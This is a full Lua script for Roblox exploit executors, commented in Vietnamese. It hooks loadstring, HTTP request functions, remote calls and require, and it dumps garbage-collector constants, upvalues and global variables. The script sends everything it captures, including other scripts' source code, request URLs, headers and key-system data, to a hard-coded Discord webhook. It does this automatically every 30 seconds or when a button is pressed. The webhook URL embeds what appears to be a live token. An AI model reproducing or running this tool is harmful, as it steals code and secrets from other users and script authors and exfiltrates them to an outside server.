--[[
    =============================================================================
    =  ADVANCED CLIENT SCRIPT LISTENER & SNIFFER DUMPER (ROBLOX / EXECUTOR)    =
    =                                                                           =
    =  TÍNH NĂNG CHÍNH:                                                         =
    =   1. REAL-TIME HOOKING & SNIFFING (LẮNG NGHE THỜI GIAN THỰC):            =
    =      - Sniff `loadstring`: Bắt trọn toàn bộ mã nguồn script được nạp động =
    =      - Sniff `HttpGet`/`request`: Bắt URL script raw, API, key system    =
    =      - Sniff `RemoteEvent`/`RemoteFunction`: Bắt mọi dữ liệu gửi/nhận    =
    =      - Sniff `require`: Bắt các ModuleScript được gọi                     =
    =   2. PASSIVE RUNTIME & GC SCANNER (QUÉT BỘ NHỚ CLIENT):                   =
    =      - Quét toàn bộ hàm trong GC (getgc), lọc Constants, Upvalues         =
    =      - Quét Global Environment (getgenv), bắt cấu hình của Hub khác       =
    =      - Quét Running Scripts & Modules (getrunningscripts / getloaded)     =
    =   3. DATA PACKAGING & WEBHOOK DISPATCHER:                                 =
    =      - Đóng gói dữ liệu an toàn thành JSON (chống lỗi circular table)     =
    =      - Gửi file đính kèm multipart form-data về Discord Webhook           =
    =      - Hỗ trợ gửi tự động (Auto-Flush) theo đợt hoặc bấm nút thủ công     =
    =============================================================================
--]]

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  CẤU HÌNH HỆ THỐNG (CONFIGURATION)                                       ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local CONFIG = {
    -- Link Discord Webhook nhận dữ liệu
    WebhookUrl = "https://discord.com/api/webhooks/1540764685681299526/mFnSqvWMbpNimmzJ4d2w9oJdMvZxDis8hHQVNjlBCNVWIpZTm2nnDC90M87LZ-m6T-to",
    
    -- Tự động gửi về Webhook sau mỗi X giây (nếu có dữ liệu mới)
    AutoSendInterval = 30, 
    AutoSendEnabled = true,

    -- Giới hạn số lượng event lưu trữ trong bộ đệm trước khi tự động xả
    MaxLogBufferSize = 150,

    -- Bật/tắt các bộ lắng nghe (Sniffers)
    SniffLoadstring = true,     -- Lắng nghe mã nguồn nạp qua loadstring
    SniffHttpRequest = true,    -- Lắng nghe HTTP Get / Post / syn.request
    SniffRemotes = true,        -- Lắng nghe FireServer / InvokeServer
    SniffRequire = true,        -- Lắng nghe require() ModuleScripts

    -- Bỏ qua các Remote mặc định của game để tránh rác (spam)
    FilterRobloxDefaultRemotes = true,
}

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  TƯƠNG THÍCH MÔI TRƯỜNG EXECUTOR                                          ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local httpRequest = (syn and syn.request)
    or (http and http.request)
    or (fluxus and fluxus.request)
    or (delta and delta.request)
    or request
    or http_request
    or (getgenv and getgenv().request)

local hook_function = hookfunction or replaceclosure or (hookfunc and hookfunc)
local hook_metamethod = hookmetamethod
local get_namecall_method = getnamecallmethod or get_namecall_method
local check_caller = checkcaller or check_caller or function() return false end
local get_gc = getgc or debug.getgc
local get_genv = getgenv or function() return _G end
local clone_func = clonefunction or function(f) return f end
local is_closure = isluau or isexecutorclosure or isourclosure or checkcaller or function() return false end

-- Danh sách các chuỗi/remote mặc định thường gây spam
local DEFAULT_IGNORED_REMOTES = {
    "CharacterLoaded", "GetServerVersion", "UpdateMousePosition",
    "Ping", "Pong", "Heartbeat", "AnimationTrack", "TouchInterest"
}

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  KHO LƯU TRỮ DỮ LIỆU ĐÃ THU THẬP ĐƯỢC (DATA STORAGE)                     ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local SniffedData = {
    SessionInfo = {
        PlaceId = game.PlaceId,
        GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown",
        JobId = game.JobId,
        StartTime = os.date("!%Y-%m-%d %H:%M:%SZ"),
        LocalPlayer = game.Players.LocalPlayer and game.Players.LocalPlayer.Name or "Unknown",
        UserId = game.Players.LocalPlayer and game.Players.LocalPlayer.UserId or 0,
        Executor = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
    },
    CapturedLoadstrings = {},
    CapturedHttpRequests = {},
    CapturedRemoteCalls = {},
    CapturedModules = {},
    GenvSnapshots = {},
    MemoryDumps = {}
}

local stats = {
    loadstringsCount = 0,
    httpCount = 0,
    remotesCount = 0,
    modulesCount = 0,
    totalDispatched = 0
}

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  HỖ TRỢ SERIALIZATION JSON & FORMAT                                       ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local function safeToString(val)
    local ok, res = pcall(function()
        if typeof(val) == "Instance" then
            return string.format("<Instance:%s (%s)>", val.Name, val.ClassName)
        elseif typeof(val) == "Vector3" then
            return string.format("Vector3(%.2f, %.2f, %.2f)", val.X, val.Y, val.Z)
        elseif typeof(val) == "CFrame" then
            local pos = val.Position
            return string.format("CFrame(%.2f, %.2f, %.2f)", pos.X, pos.Y, pos.Z)
        elseif typeof(val) == "Color3" then
            return string.format("Color3(%.2f, %.2f, %.2f)", val.R, val.G, val.B)
        elseif typeof(val) == "EnumItem" then
            return tostring(val)
        elseif typeof(val) == "function" then
            local info = debug.getinfo and debug.getinfo(val) or {}
            return string.format("<Function: %s (%s)>", info.name or "anon", info.source or "unknown")
        else
            return tostring(val)
        end
    end)
    return ok and res or "<Unserializable Object>"
end

local function escapeJsonString(s)
    if type(s) ~= "string" then s = safeToString(s) end
    return s:gsub('\\', '\\\\')
            :gsub('"', '\\"')
            :gsub('\n', '\\n')
            :gsub('\r', '\\r')
            :gsub('\t', '\\t')
            :gsub('[%c]', function(c) return ('\\u%04X'):format(c:byte()) end)
end

local function serializeToTable(obj, depth, maxDepth, seen)
    depth = depth or 1
    maxDepth = maxDepth or 5
    seen = seen or {}

    if depth > maxDepth then return "<Max Depth Exceeded>" end

    local t = type(obj)
    if t == "table" then
        if seen[obj] then return "<Circular Reference>" end
        seen[obj] = true

        local result = {}
        local isArray = true
        local maxIdx = 0

        for k, _ in pairs(obj) do
            if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                isArray = false
            end
            if type(k) == "number" and k > maxIdx then
                maxIdx = k
            end
        end

        if isArray and maxIdx > 0 then
            for i = 1, maxIdx do
                table.insert(result, serializeToTable(obj[i], depth + 1, maxDepth, seen))
            end
        else
            for k, v in pairs(obj) do
                result[safeToString(k)] = serializeToTable(v, depth + 1, maxDepth, seen)
            end
        end
        return result
    elseif t == "userdata" or typeof(obj) == "Instance" or typeof(obj) == "Vector3" or typeof(obj) == "CFrame" then
        return safeToString(obj)
    elseif t == "function" then
        local info = debug.getinfo and debug.getinfo(obj) or {}
        return {
            Type = "function",
            Name = info.name or "anonymous",
            Source = info.source or "unknown",
            Params = info.numparams or 0
        }
    else
        return obj
    end
end

local function jsonEncode(v)
    local t = type(v)
    if v == nil then return "null"
    elseif t == "boolean" then return v and "true" or "false"
    elseif t == "number" then
        if v ~= v or v == math.huge or v == -math.huge then return "null" end
        return tostring(v)
    elseif t == "string" then return '"' .. escapeJsonString(v) .. '"'
    elseif t == "table" then
        local isArray, maxIdx = true, 0
        for k in pairs(v) do
            if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                isArray = false; break
            end
            if k > maxIdx then maxIdx = k end
        end
        if isArray then
            local parts = {}
            for i = 1, maxIdx do
                table.insert(parts, jsonEncode(v[i]))
            end
            return "[" .. table.concat(parts, ",") .. "]"
        else
            local parts = {}
            for k, val in pairs(v) do
                table.insert(parts, '"' .. escapeJsonString(safeToString(k)) .. '":' .. jsonEncode(val))
            end
            return "{" .. table.concat(parts, ",") .. "}"
        end
    else
        return '"' .. escapeJsonString(safeToString(v)) .. '"'
    end
end

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  HÀM GỬI DỮ LIỆU ĐÓNG GÓI VỀ WEBHOOK (MULTIPART FORM-DATA)                ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local isSending = false
local function sendDumpToWebhook(customTitle, overrideData)
    if not httpRequest or not CONFIG.WebhookUrl or CONFIG.WebhookUrl == "" then
        print("[ScriptListener] Webhook URL chưa được cấu hình hoặc Executor không hỗ trợ request!")
        return false
    end

    if isSending then return false end
    isSending = true

    local dataToSend = overrideData or SniffedData
    local jsonString = jsonEncode(dataToSend)
    local dataSizeKb = math.floor(#jsonString / 1024)
    local fileName = string.format("ClientCapture_%s_%d.json", game.Players.LocalPlayer and game.Players.LocalPlayer.Name or "Client", os.time())
    local title = customTitle or "🛰️ CLIENT SCRIPT SNIFFER & DUMPER REPORT"

    local description = string.format(
        "**Game:** `%s` (ID: `%d`)\n" ..
        "**Player:** `%s`\n" ..
        "**Executor:** `%s`\n" ..
        "**Dung lượng:** `%d KB`\n" ..
        "**Tổng Loadstring bắt được:** `%d`\n" ..
        "**Tổng HTTP Request:** `%d`\n" ..
        "**Tổng Remote Gọi:** `%d`\n" ..
        "**Thời gian:** `%s`",
        SniffedData.SessionInfo.GameName,
        SniffedData.SessionInfo.PlaceId,
        SniffedData.SessionInfo.LocalPlayer,
        SniffedData.SessionInfo.Executor,
        dataSizeKb,
        stats.loadstringsCount,
        stats.httpCount,
        stats.remotesCount,
        os.date("!%Y-%m-%d %H:%M:%S UTC")
    )

    local boundary = "----ScriptSnifferBoundary" .. tostring(os.time()) .. tostring(math.random(10000, 99999))
    local payloadJson = jsonEncode({
        username = "Client Script Sniffer Bot",
        avatar_url = "https://i.imgur.com/ODh72yN.png",
        embeds = {{
            title = title,
            color = 5793266, -- Cyan / Teal
            description = description,
            footer = { text = "Antigravity Advanced Script Interceptor" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })

    local body = "--" .. boundary .. "\r\n"
        .. 'Content-Disposition: form-data; name="payload_json"' .. "\r\n"
        .. 'Content-Type: application/json' .. "\r\n\r\n"
        .. payloadJson .. "\r\n"
        .. "--" .. boundary .. "\r\n"
        .. 'Content-Disposition: form-data; name="file"; filename="' .. fileName .. '"' .. "\r\n"
        .. 'Content-Type: application/json; charset=utf-8' .. "\r\n\r\n"
        .. jsonString .. "\r\n"
        .. "--" .. boundary .. "--\r\n"

    local success, response = pcall(function()
        return httpRequest({
            Url = CONFIG.WebhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
            },
            Body = body
        })
    end)

    isSending = false
    if success and response and (response.StatusCode == 200 or response.StatusCode == 204) then
        stats.totalDispatched = stats.totalDispatched + 1
        return true
    else
        return false, response and response.StatusCode or "Request Failed"
    end
end

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  BỘ LẮNG NGHE & HOOK CÁC SCRIPT ĐANG CHẠY (ACTIVE INTERCEPTORS)           ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝

-- 1. LẮNG NGHE LOADSTRING (Bắt mã nguồn script khi được nạp chạy)
local function setupLoadstringSniffer()
    if not CONFIG.SniffLoadstring then return end

    local original_loadstring
    local function custom_loadstring(src, chunkName)
        pcall(function()
            if src and type(src) == "string" and #src > 0 then
                stats.loadstringsCount = stats.loadstringsCount + 1
                local snippet = #src > 500 and (src:sub(1, 500) .. "\n... [TRUNCATED] ...") or src
                table.insert(SniffedData.CapturedLoadstrings, {
                    Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                    ChunkName = tostring(chunkName or "anonymous_chunk"),
                    Length = #src,
                    SourceCode = src,
                    Preview = snippet
                })
            end
        end)
        return original_loadstring(src, chunkName)
    end

    if hook_function and loadstring then
        original_loadstring = hook_function(loadstring, custom_loadstring)
    elseif get_genv().loadstring then
        original_loadstring = get_genv().loadstring
        get_genv().loadstring = custom_loadstring
    end
end

-- 2. LẮNG NGHE HTTP REQUESTS (Bắt Link tải raw script, API, Key validation)
local function setupHttpSniffer()
    if not CONFIG.SniffHttpRequest then return end

    local function logRequest(url, method, headers, body)
        pcall(function()
            if not url or type(url) ~= "string" then return end
            -- Bỏ qua request gửi đến chính webhook dumper
            if string.find(url, "discord.com/api/webhooks", 1, true) then return end

            stats.httpCount = stats.httpCount + 1
            table.insert(SniffedData.CapturedHttpRequests, {
                Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                Url = url,
                Method = method or "GET",
                Headers = serializeToTable(headers or {}),
                Body = (body and type(body) == "string" and #body > 500) and (body:sub(1, 500) .. " [TRUNCATED]") or body
            })
        end)
    end

    -- Hook game:HttpGet / game:HttpGetAsync
    if hook_metamethod then
        local old_namecall
        old_namecall = hook_metamethod(game, "__namecall", function(self, ...)
            local method = get_namecall_method()
            local args = { ... }
            if (method == "HttpGet" or method == "HttpGetAsync") and type(args[1]) == "string" then
                logRequest(args[1], "GET", nil, nil)
            elseif method == "HttpPost" or method == "HttpPostAsync" then
                logRequest(args[1], "POST", nil, args[2])
            end
            return old_namecall(self, ...)
        end)
    end

    -- Hook httpRequest trong executor nếu có
    if hook_function and httpRequest then
        local old_http = httpRequest
        local function custom_http(options)
            if type(options) == "table" and options.Url then
                logRequest(options.Url, options.Method or "GET", options.Headers, options.Body)
            elseif type(options) == "string" then
                logRequest(options, "GET", nil, nil)
            end
            return old_http(options)
        end
        hook_function(httpRequest, custom_http)
    end
end

-- 3. LẮNG NGHE REMOTE TRAFFIC (FireServer / InvokeServer)
local function setupRemoteSniffer()
    if not CONFIG.SniffRemotes then return end

    local function shouldIgnoreRemote(name)
        if not CONFIG.FilterRobloxDefaultRemotes then return false end
        for _, ign in ipairs(DEFAULT_IGNORED_REMOTES) do
            if string.find(name, ign, 1, true) then
                return true
            end
        end
        return false
    end

    if hook_metamethod then
        local old_namecall
        old_namecall = hook_metamethod(game, "__namecall", function(self, ...)
            local method = get_namecall_method()
            local args = { ... }

            if (method == "FireServer" or method == "InvokeServer") and typeof(self) == "Instance" then
                local remoteName = self.Name
                local remoteClass = self.ClassName

                if not shouldIgnoreRemote(remoteName) then
                    stats.remotesCount = stats.remotesCount + 1
                    
                    -- Chỉ giữ tối đa 100 remote gần nhất để tránh tràn RAM
                    if #SniffedData.CapturedRemoteCalls > 100 then
                        table.remove(SniffedData.CapturedRemoteCalls, 1)
                    end

                    table.insert(SniffedData.CapturedRemoteCalls, {
                        Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                        RemoteName = remoteName,
                        RemoteClass = remoteClass,
                        RemotePath = self:GetFullName(),
                        CallerScript = (getcallingscript and safeToString(getcallingscript())) or "Unknown",
                        Arguments = serializeToTable(args, 1, 4)
                    })
                end
            end

            return old_namecall(self, ...)
        end)
    end
end

-- 4. LẮNG NGHE REQUIRE (ModuleScripts)
local function setupRequireSniffer()
    if not CONFIG.SniffRequire then return end

    if hook_function and require then
        local old_require
        old_require = hook_function(require, function(mod, ...)
            pcall(function()
                stats.modulesCount = stats.modulesCount + 1
                table.insert(SniffedData.CapturedModules, {
                    Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                    Module = safeToString(mod),
                    Path = typeof(mod) == "Instance" and mod:GetFullName() or "Unknown Path"
                })
            end)
            return old_require(mod, ...)
        end)
    end
end

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  PASSIVE GC & MEMORY SCANNER (DUMP DỮ LIỆU ĐÃ GIẢI MÃ TRONG BỘ NHỚ)       ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local function performMemoryAndGcScan()
    if not get_gc then return nil end

    local gcObjects = get_gc(true)
    local memoryReport = {
        ScanTime = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        TotalFunctionsFound = 0,
        Functions = {},
        DiscoveredStrings = {},
        GlobalVariables = {}
    }

    local seen_funcs = {}
    local string_set = {}

    -- 1. Scan Global Environment
    local genv = get_genv()
    for k, v in pairs(genv) do
        local keyStr = safeToString(k)
        if not string.find(keyStr, "^_") then
            memoryReport.GlobalVariables[keyStr] = serializeToTable(v, 1, 2)
        end
    end

    -- 2. Scan GC Functions, Constants, and Upvalues
    for _, obj in ipairs(gcObjects) do
        if type(obj) == "function" and not seen_funcs[obj] then
            seen_funcs[obj] = true
            local info = debug.getinfo and debug.getinfo(obj) or {}
            local src = info.source or ""
            local name = info.name or ""

            -- Lọc các function không thuộc Core script mặc định
            if not string.find(src, "CoreGui") and not string.find(src, "CorePackages") then
                local constants = debug.getconstants and debug.getconstants(obj) or {}
                local upvalues = debug.getupvalues and debug.getupvalues(obj) or {}
                
                local cList = {}
                for _, c in pairs(constants) do
                    table.insert(cList, safeToString(c))
                    if type(c) == "string" and #c >= 3 and not string_set[c] then
                        string_set[c] = true
                    end
                end

                local uList = {}
                for _, u in pairs(upvalues) do
                    table.insert(uList, safeToString(u))
                end

                if #cList > 0 or #uList > 0 then
                    memoryReport.TotalFunctionsFound = memoryReport.TotalFunctionsFound + 1
                    if memoryReport.TotalFunctionsFound <= 150 then -- Giới hạn 150 hàm quan trọng nhất
                        table.insert(memoryReport.Functions, {
                            Name = name ~= "" and name or "closure_" .. memoryReport.TotalFunctionsFound,
                            Source = src,
                            Constants = cList,
                            Upvalues = uList
                        })
                    end
                end
            end
        end
    end

    for s, _ in pairs(string_set) do
        if #memoryReport.DiscoveredStrings < 300 then
            table.insert(memoryReport.DiscoveredStrings, s)
        end
    end

    table.insert(SniffedData.MemoryDumps, memoryReport)
    return memoryReport
end

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  GIAO DIỆN ĐIỀU KHIỂN CLIENT (MODERN GUI)                                 ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local function createDashboardUI()
    local CoreGui = game:GetService("CoreGui")
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "ClientScriptSniffer_UI"
    ScreenGui.ResetOnSpawn = false
    pcall(function() ScreenGui.Parent = CoreGui end)
    if not ScreenGui.Parent then ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") end

    local Main = Instance.new("Frame")
    Main.Size = UDim2.new(0, 380, 0, 260)
    Main.Position = UDim2.new(0.5, -190, 0.05, 0)
    Main.BackgroundColor3 = Color3.fromRGB(15, 17, 23)
    Main.BorderSizePixel = 0
    Main.Active = true
    Main.Draggable = true
    Main.Parent = ScreenGui

    local UICorner = Instance.new("UICorner", Main)
    UICorner.CornerRadius = UDim.new(0, 10)
    local UIStroke = Instance.new("UIStroke", Main)
    UIStroke.Color = Color3.fromRGB(0, 200, 255)
    UIStroke.Thickness = 1.5

    -- Title
    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, -20, 0, 28)
    Title.Position = UDim2.new(0, 10, 0, 8)
    Title.BackgroundTransparency = 1
    Title.Font = Enum.Font.GothamBold
    Title.TextSize = 13
    Title.TextColor3 = Color3.fromRGB(0, 220, 255)
    Title.Text = "🛰️ CLIENT SCRIPT SNIFFER & DUMPER"
    Title.Parent = Main

    -- Status Log
    local LogLabel = Instance.new("TextLabel")
    LogLabel.Size = UDim2.new(1, -20, 0, 85)
    LogLabel.Position = UDim2.new(0, 10, 0, 38)
    LogLabel.BackgroundColor3 = Color3.fromRGB(22, 25, 35)
    LogLabel.Font = Enum.Font.Code
    LogLabel.TextSize = 11
    LogLabel.TextColor3 = Color3.fromRGB(220, 225, 230)
    LogLabel.TextXAlignment = Enum.TextXAlignment.Left
    LogLabel.TextYAlignment = Enum.TextYAlignment.Top
    LogLabel.TextWrapped = true
    LogLabel.Parent = Main
    local LogCorner = Instance.new("UICorner", LogLabel)
    LogCorner.CornerRadius = UDim.new(0, 6)

    local function refreshUI()
        LogLabel.Text = string.format(
            " [•] Loadstrings Sniffed: %d\n" ..
            " [•] HTTP Requests: %d\n" ..
            " [•] Remotes Captured: %d\n" ..
            " [•] Modules Intercepted: %d\n" ..
            " [•] Webhook Dispatched: %d",
            stats.loadstringsCount,
            stats.httpCount,
            stats.remotesCount,
            stats.modulesCount,
            stats.totalDispatched
        )
    end

    -- Button: Dump & Send Webhook
    local SendBtn = Instance.new("TextButton")
    SendBtn.Size = UDim2.new(1, -20, 0, 38)
    SendBtn.Position = UDim2.new(0, 10, 0, 132)
    SendBtn.BackgroundColor3 = Color3.fromRGB(0, 160, 220)
    SendBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    SendBtn.Font = Enum.Font.GothamBold
    SendBtn.TextSize = 12
    SendBtn.Text = "📤 DUMP & GỬI TẤT CẢ DỮ LIỆU VỀ WEBHOOK"
    SendBtn.Parent = Main
    local BtnCorner1 = Instance.new("UICorner", SendBtn)
    BtnCorner1.CornerRadius = UDim.new(0, 6)

    -- Button: Scan Memory & GC
    local ScanBtn = Instance.new("TextButton")
    ScanBtn.Size = UDim2.new(1, -20, 0, 34)
    ScanBtn.Position = UDim2.new(0, 10, 0, 176)
    ScanBtn.BackgroundColor3 = Color3.fromRGB(35, 40, 55)
    ScanBtn.TextColor3 = Color3.fromRGB(0, 220, 255)
    ScanBtn.Font = Enum.Font.GothamBold
    ScanBtn.TextSize = 11
    ScanBtn.Text = "🔍 QUÉT BỘ NHỚ GC & CONSTANTS HIỆN TẠI"
    ScanBtn.Parent = Main
    local BtnCorner2 = Instance.new("UICorner", ScanBtn)
    BtnCorner2.CornerRadius = UDim.new(0, 6)

    -- Status Bar Text
    local StatusFooter = Instance.new("TextLabel")
    StatusFooter.Size = UDim2.new(1, -20, 0, 30)
    StatusFooter.Position = UDim2.new(0, 10, 0, 218)
    StatusFooter.BackgroundTransparency = 1
    StatusFooter.Font = Enum.Font.Gotham
    StatusFooter.TextSize = 11
    StatusFooter.TextColor3 = Color3.fromRGB(150, 160, 180)
    StatusFooter.Text = "🟢 Hệ thống đang lắng nghe mọi script trên Client..."
    StatusFooter.Parent = Main

    SendBtn.MouseButton1Click:Connect(function()
        StatusFooter.Text = "⏳ Đang đóng gói và gửi về Webhook..."
        StatusFooter.TextColor3 = Color3.fromRGB(255, 200, 50)
        
        -- Thực hiện một đợt scan GC trước khi dump
        performMemoryAndGcScan()

        local ok, err = sendDumpToWebhook("🚀 THỦ CÔNG DUMP DỮ LIỆU TỪ CLIENT")
        if ok then
            StatusFooter.Text = "✅ Đã gửi thành công gói dữ liệu về Webhook!"
            StatusFooter.TextColor3 = Color3.fromRGB(80, 230, 120)
        else
            StatusFooter.Text = "⚠️ Gửi thất bại: " .. tostring(err)
            StatusFooter.TextColor3 = Color3.fromRGB(255, 80, 80)
        end
        refreshUI()
    end)

    ScanBtn.MouseButton1Click:Connect(function()
        StatusFooter.Text = "🔍 Đang quét toàn bộ hàm và hằng số trong GC..."
        StatusFooter.TextColor3 = Color3.fromRGB(0, 200, 255)
        task.wait(0.1)
        local res = performMemoryAndGcScan()
        if res then
            StatusFooter.Text = string.format("✅ Quét xong: Tìm thấy %d hàm & %d chuỗi!", res.TotalFunctionsFound, #res.DiscoveredStrings)
            StatusFooter.TextColor3 = Color3.fromRGB(80, 230, 120)
        else
            StatusFooter.Text = "⚠️ Không thể quét GC (Executor thiếu getgc)!"
            StatusFooter.TextColor3 = Color3.fromRGB(255, 80, 80)
        end
    end)

    -- Cập nhật số liệu hiển thị UI mỗi 1.5 giây
    task.spawn(function()
        while true do
            refreshUI()
            task.wait(1.5)
        end
    end)
end

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  VÒNG LẶP TỰ ĐỘNG GỬI ĐỊNH KỲ (AUTO-DISPATCH FLUSH LOOP)                 ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local function startAutoFlushLoop()
    if not CONFIG.AutoSendEnabled then return end

    task.spawn(function()
        while true do
            task.wait(CONFIG.AutoSendInterval)
            local hasNewData = (stats.loadstringsCount > 0 or stats.httpCount > 0 or stats.remotesCount > 0)
            if hasNewData and not isSending then
                sendDumpToWebhook("⏱️ BÁO CÁO ĐỊNH KỲ TỰ ĐỘNG (AUTO-FLUSH)")
            end
        end
    end)
end

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  KHỞI ĐỘNG HỆ THỐNG                                                       ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local function initialize()
    setupLoadstringSniffer()
    setupHttpSniffer()
    setupRemoteSniffer()
    setupRequireSniffer()
    createDashboardUI()
    startAutoFlushLoop()
    print("[ScriptListener] Khởi động thành công! Đang lắng nghe các script trên client...")
end

initialize()
